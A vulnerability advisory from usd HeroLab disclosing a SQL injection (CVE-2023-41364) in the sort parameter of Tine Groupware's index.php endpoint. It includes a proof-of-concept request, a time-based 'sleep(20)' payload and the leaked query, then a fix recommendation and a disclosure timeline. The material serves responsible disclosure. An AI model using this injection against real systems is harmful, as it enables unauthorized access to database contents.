
[![](https://herolab.usd.de/wp-content/uploads/sites/9/2021/07/usd-HeroLab-Logo-hell-nebeneinander.svg "usd HeroLab Logo hell nebeneinander")](https://herolab.usd.de/)

* [Über uns](https://herolab.usd.de/ueber-uns/)
  + [Wie wir arbeiten](https://herolab.usd.de/wie-wir-arbeiten/)
  + [Unsere Expert\*innen](https://herolab.usd.de/unsere-experten/)
  + [Unsere Leistungen](https://www.usd.de/security-analysis-pentests/)
  + [Unsere Plattformen und Tools](https://herolab.usd.de/unsere-plattformen-und-tools/)
* [Security Research](https://herolab.usd.de/security-research/)
  + [Unser Engagement](/security-research/#engagement)
  + [Security Advisories](https://herolab.usd.de/security-advisories/)
  + [Responsible Disclosure](https://herolab.usd.de/responsible-disclosure/)
* [LabNews](https://herolab.usd.de/labnews/)
* [Meet the Team](https://herolab.usd.de/meet-the-team/)
* [usd AG](http://www.usd.de)
* [English](https://herolab.usd.de/en/security-advisories/usd-2023-0002/ "English")

[![](https://herolab.usd.de/wp-content/uploads/sites/9/2021/07/usd-HeroLab-Logo-hell-nebeneinander.svg)](https://herolab.usd.de/)

* [Über uns](https://herolab.usd.de/ueber-uns/)
  + [Wie wir arbeiten](https://herolab.usd.de/wie-wir-arbeiten/)
  + [Unsere Expert\*innen](https://herolab.usd.de/unsere-experten/)
  + [Unsere Leistungen](https://www.usd.de/security-analysis-pentests/)
  + [Unsere Plattformen und Tools](https://herolab.usd.de/unsere-plattformen-und-tools/)
* [Security Research](https://herolab.usd.de/security-research/)
  + [Unser Engagement](/security-research/#engagement)
  + [Security Advisories](https://herolab.usd.de/security-advisories/)
  + [Responsible Disclosure](https://herolab.usd.de/responsible-disclosure/)
* [LabNews](https://herolab.usd.de/labnews/)
* [Meet the Team](https://herolab.usd.de/meet-the-team/)
* [usd AG](http://www.usd.de)
* [English](https://herolab.usd.de/en/security-advisories/usd-2023-0002/ "English")

# usd-2023-0002 | tine20 2023.01.14.325 - SQL Injection

#

**Advisory ID**: usd-2023-0002

**Product**: tine groupware

**Affected Version**: 2023.01.14.325

**Vulnerability Type**: CWE 89 - Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

**Security Risk**: Critical

**Vendor URL**: <https://www.tine-groupware.de/>

**Vendor Status**: Fixed

**CVE number**: CVE-2023-41364

**CVE Link**: <https://nvd.nist.gov/vuln/detail/CVE-2023-41364>

**Last Update**: 2023-08-28

###

### Description

Tine Groupware is an open source software that provides a suite of collaborative tools and applications for communication and project management within a business or organization.

It offers features such as email, calendars, task management, contact management, and document management, allowing users to coordinate and share information across teams and departments.

During our research on open open source software, we discovered, that the **sort** parameter of the **/index.php** endpoint is vulnerable to SQL-Injection.

### Proof of Concept

The request below was used to search contacts in the addressbook.

```
POST /index.php?transactionid=ae67275bb875279ab755f7e8932334f1f67fbb4c HTTP/1.1
Host: localhost:4000
Content-Length: 376
Cookie: TINE20SESSID=isgch37p9s2ql7rl902b9cjabk; usercredentialcache=eyJpZCI6ImNmZWE3Y2Y4OGE5MjcyM2M5N2JkMWNkOTRmYmRjNzA1ZGY5NzJiODEiLCJrZXkiOiI0MGU1MWE5NTE1ZDIwMWExOTE0MmYxNmMifQ%3D%3D
Connection: close
[...]

{"jsonrpc":"2.0","method":"Addressbook.searchContacts","params":{"filter":[{"condition":"OR","filters":[{"condition":"AND","filters":[],"id":"ext-comp-1229","label":"Contacts"}],"id":"FilterPanel"},{"field":"query","operator":"contains","value":null,"id":"quickFilter"}],"paging":{"sort":"n_fileas'","dir":"ASC","start":0,"limit":50}},"id":33}
```

The response contains the SQL query if injecting more SQLi payloads:

```
HTTP/1.1 200 OK
Server: nginx
Content-Type: application/json
Content-Length: 3853
[...]

{"error":{"code":-32000,"message":"SQLSTATE[42S22]: Column not found: 1054 Unknown column 'n_fileas, sleep(20)' in 'order clause', query was: SELECT **addressbook**.*, (CASE WHEN **addressbook_image**.**contact_id** IS NULL THEN 0 ELSE 1 END) AS **jpegphoto**, **accounts**.**id** AS **account_id** FROM **tine_addressbook** AS **addressbook**\n LEFT JOIN **tine_addressbook_image** AS **addressbook_image** ON **addressbook**.**id** = **addressbook_image**.**contact_id**\n LEFT JOIN **tine_accounts** AS **accounts** ON **addressbook**.**id** = **accounts**.**contact_id** WHERE (**addressbook**.**is_deleted** = 0) AND (**addressbook**.**id** in ('8862248fdce32e46c05a84b12c9e74407f44a23b', 'b70f5321b4339a037e5427ec2504dafa84006d15')) GROUP BY **addressbook**.**id** ORDER BY **n_fileas, sleep(20)** ASC, **account_id** ASC",
```

Injecting a **sleep(20)** into the parameter delays the response.

A successful exploitation of this vulnerability allows an unauthorized person to gain access to sensitive data in the database.

### Fix

It is recommended to use prepared statements.

### References

* <https://owasp.org/www-community/attacks/SQL_Injection>

### Timeline

* **2023-01-24**: First contact request via mail
* **2023-04-21**: Ask vendor for status update
* **2023-05-04**: Vendor does not see an exploitable vulnerability
* **2023-05-15**: Share more payloads and proofs to the vendor
* **2023-05-17**: Vendor denies exploitable vulnerability
* **2023-05-23**: Vulnerability is fixed, according to the vendor

### Credits

This security vulnerability was identified by Christian Pöschl of usd AG.

### About usd Security Advisories

![](https://herolab.usd.de/wp-content/uploads/sites/9/2021/07/icon-hero.png "icon-hero")

In order to protect businesses against hackers and criminals, we always have to keep our skills and knowledge up to date. Thus, security research is just as important for our work as is building up a security community to promote the exchange of knowledge. After all, more security can only be achieved if many individuals take on the task.

Our [CST Academy](https://www.usd.de/en/cst-academy/) and our [usd HeroLab](https://herolab.usd.de/en/) are essential parts of our security mission. We share the knowledge we gain in our practical work and our research through training courses and publications. In this context, the [usd HeroLab](https://herolab.usd.de/en/) publishes a series of papers on new vulnerabilities and current security issues.

Always for the sake of our mission: „more security.“

[to usd AG](https://www.usd.de/)

In accordance with usd AG’s [Responsible Disclosure Policy](/en/responsible-disclosure/), all vendors have been notified of the existence of these vulnerabilities.

##

### Disclaimer

The information provided in this security advisory is provided „as is“ and without warranty of any kind. Details of this security advisory may be updated in order to provide as accurate information as possible.

#### usd HeroLab

[Kontakt](https://www.usd.de/kontakt/)
[Impressum](https://www.usd.de/impressum/)
[Datenschutz](https://www.usd.de/datenschutz/)
[AGB](https://www.usd.de/allgemeine-geschaeftsbedingungen-beratung/)

© 2023 usd AG

#### LabNews

## [From Unicode to Exploit: The Security Risks of Overlong UTF-8 Encodings](https://herolab.usd.de/the-security-risks-of-overlong-utf-8-encodings/)

Sep. 6, 2024

Written by Dominique Dittert, Senior Security Consultant, usd HeroLab In the dynamic field of cybersecurity, it is often the obscure and long-forgotten vulnerabilities that pose a hidden threat to otherwise hardened systems. One such vulnerability lies in invalid...

## [Security Advisories zu hugocms und Gitea](https://herolab.usd.de/security-advisories-zu-hugocms-und-gitea/)

Juli 25, 2024

Die Pentest Professionals des usd HeroLabs haben während der Durchführung ihrer Pentests hugocms und Gitea untersucht. Dabei wurden mehrere Schwachstellen auf den verschiedenen Anwendungen identifiziert. Die Schwachstelle wurde dem Hersteller im Rahmen der Responsible...

## [Security Advisory zu AXIS Webcam](https://herolab.usd.de/security-advisory-zu-axis-webcam/)

Juli 1, 2024

Die Pentest Professionals des usd HeroLabs haben während der Durchführung ihrer Pentests die AXIS Webcam (P1364) untersucht. Unsere Professionals entdeckten eine Sicherheitslücke (Cross-Site Request Forgery) im Adminpanel der AXIS P1364 Webcam. Das Ausnutzen dieser...

#### Folgen Sie uns

[![](https://herolab.usd.de/wp-content/uploads/sites/9/2023/10/usd-social-media-github.svg)](https://github.com/usdAG/)    [![](https://herolab.usd.de/wp-content/uploads/sites/9/2023/10/usd-social-media-reddit.svg)](https://www.reddit.com/user/usdAG/?rdt=60932)    [![](https://www.usd.de/wp-content/uploads/usd-social-media-youtube.svg)](https://www.youtube.com/c/usdAG)    [![](https://www.usd.de/wp-content/uploads/usd-social-media-mastodon.svg)](https://infosec.exchange/%40usdAG)

[![](https://www.usd.de/wp-content/uploads/usd-social-media-x.svg)](https://twitter.com/usdAG)[![](https://www.usd.de/wp-content/uploads/usd-social-media-meetup.svg)](https://www.meetup.com/de-DE/Cyber-Security-Transformation-Academy/?_locale=de-DE)    [![](https://www.usd.de/wp-content/uploads/usd-social-media-instagram.svg)](https://www.instagram.com/usdhero/)    [![](https://www.usd.de/wp-content/uploads/usd-social-media-linkedin.svg)](https://www.linkedin.com/company/usdag/?originalSubdomain=de)

[Meldung einer Schwachstelle oder eines Bugs](https://www.usd.de/meldung-bug-oder-schwachstelle/)

[Code of Ethics](/code-of-ethics/)

